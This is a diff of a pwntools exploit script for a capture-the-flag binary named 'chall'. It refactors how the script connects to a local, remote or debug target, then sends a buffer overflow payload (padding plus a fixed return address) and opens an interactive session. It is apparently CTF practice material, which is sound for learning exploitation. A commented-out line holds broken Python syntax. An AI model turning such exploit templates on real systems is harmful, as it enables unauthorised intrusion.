@@ -1,25 +1,27 @@
 from pwn import *
+import sys
 
-binary_name = "chall"
+binary_name = "./chall"
 remote_name = "localhost"
 remote_port = 9001
 libc_name = "libc.so.6"
 
 context.terminal = ["tmux", "splitw", "-h"]
+context.arch = "amd64"
+context.bits = 64
 
-REMOTE = 0
-LOCAL = 1
-DEBUG = 2
+
+TARGET_ARGS = {"REMOTE": 0, "LOCAL": 1, "DEBUG": 2}
 
 
 def conn(exploit_target=0):
-    if exploit_target == 0:
+    if exploit_target == TARGET_ARGS["REMOTE"]:
         return remote(remote_name, remote_port)
 
-    if exploit_target == 1:
+    if exploit_target == TARGET_ARGS["LOCAL"]:
         return process(binary_name)
 
-    if exploit_target == 2:
+    if exploit_target == TARGET_ARGS["DEBUG"]:
         return gdb.debug(
             binary_name,
             gdbscript="""
@@ -31,7 +33,7 @@ def conn(exploit_target=0):
     return remote(remote_name, remote_port)
 
 
-io = conn(exploit_target=LOCAL)
+io = conn(exploit_target=TARGET_ARGS[sys.argv[1][1:]])
 
 elf = ELF(binary_name)
 # libc = ELF(libc_name)
@@ -43,7 +45,6 @@ elf = ELF(binary_name)
 payload = b"a" * 0x10
 payload += p64(0x4011D6)
 
-
 io.sendlineafter(b">", payload)
 
 io.interactive()
@@ -51,7 +52,8 @@ io.interactive()
 # def exploit(io: remote | process)
 #     try:
 #         return 0
-#     except:
+#     except except BaseException as e:
+#         print(e)
 #         return 1
 
 # while True:
@@ -59,5 +61,6 @@ io.interactive()
 #     if exploit(io):
 #         io.close()
 #         continue
+# #       input()
 #     io.interactive()
 #     break
